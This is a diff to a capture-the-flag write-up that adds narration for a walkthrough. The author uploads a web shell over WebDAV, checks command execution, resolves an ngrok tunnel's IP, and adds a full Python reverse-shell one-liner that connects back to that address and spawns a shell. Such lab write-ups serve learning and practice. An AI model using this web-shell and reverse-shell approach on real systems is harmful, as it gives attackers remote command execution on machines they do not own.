@@ -114,15 +114,19 @@ dav:/webdav/>
 
 ```
 
+we did that now let's check back the webpage to see our shell 
+
 ![image](https://user-images.githubusercontent.com/87468669/194126637-3fd3164f-2b79-4724-9a26-c1839c539120.png)
 
+great we can execute some commands on the shell we uploaded
 
 ![image](https://user-images.githubusercontent.com/87468669/194126743-bb62ec9f-8cff-43c3-a430-d396f391a395.png)
 
+Now let get a reverse shell using ngrok.
 
 ![image](https://user-images.githubusercontent.com/87468669/194126878-06588b8b-f61b-4b65-8f38-3e4a0aa10846.png)
 
-now let's ping our ngrok.io to get an ip address
+ping our ngrok.io to get an ip address
 ```
 ┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/method]
 └─$ ping -c 2 2.tcp.eu.ngrok.io
@@ -134,6 +138,11 @@ PING 2.tcp.eu.ngrok.io (3.126.37.18) 56(84) bytes of data.
 2 packets transmitted, 2 received, 0% packet loss, time 1001ms
 rtt min/avg/max/mdev = 145.905/152.805/159.706/6.900 ms
 
+```
+
+reverse shell payload 
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.126.37.18",18416));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
 ![image](https://user-images.githubusercontent.com/87468669/194127758-cb433e30-7425-45a6-8d5d-f8cac0fd0ca2.png)
